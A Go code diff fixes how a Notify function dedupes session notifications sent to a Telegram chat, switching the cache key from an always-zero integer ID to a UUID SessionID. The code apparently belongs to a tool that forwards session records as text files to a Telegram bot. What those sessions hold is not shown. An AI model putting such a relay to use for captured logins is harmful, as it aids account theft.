@@ -319,11 +319,18 @@ func formatSessionMessage(session TSession) string {
 }
 
 func Notify(session TSession, chatid string, teletoken string) {
+	// Use the UUID-based SessionID as the deduplication key, not the integer ID
+	// (which is always 0 and would conflate all sessions into one).
+	cacheKey := session.SessionID
+	if cacheKey == "" {
+		cacheKey = fmt.Sprintf("id-%d", session.ID)
+	}
+
 	mu.Lock()
-	// Check if the session is already processed
-	if lastNotified, exists := processedSessions[string(session.ID)]; exists && time.Since(lastNotified) < 5*time.Minute {
+	// Check if this session was already notified recently → send an update instead.
+	if lastNotified, exists := processedSessions[cacheKey]; exists && time.Since(lastNotified) < 5*time.Minute {
 		mu.Unlock()
-		messageID, exists := sessionMessageMap[string(session.ID)]
+		messageID, exists := sessionMessageMap[cacheKey]
 		if exists {
 			txtFilePath, err := createTxtFile(session)
 			if err != nil {
@@ -337,13 +344,13 @@ func Notify(session TSession, chatid string, teletoken string) {
 			}
 			os.Remove(txtFilePath)
 		} else {
-			fmt.Println("Message ID not found for session:", session.ID)
+			fmt.Println("Message ID not found for session:", cacheKey)
 		}
 		return
 	}
 
 	// Mark session as processed
-	processedSessions[string(session.ID)] = time.Now()
+	processedSessions[cacheKey] = time.Now()
 
 	// Clean up old entries (forget sessions older than 30 minutes)
 	for sid, t := range processedSessions {
@@ -373,7 +380,7 @@ func Notify(session TSession, chatid string, teletoken string) {
 
 	// Map the session ID to the message ID
 	mu.Lock()
-	sessionMessageMap[string(session.ID)] = messageID
+	sessionMessageMap[cacheKey] = messageID
 	mu.Unlock()
 
 	// Remove the temporary TXT file
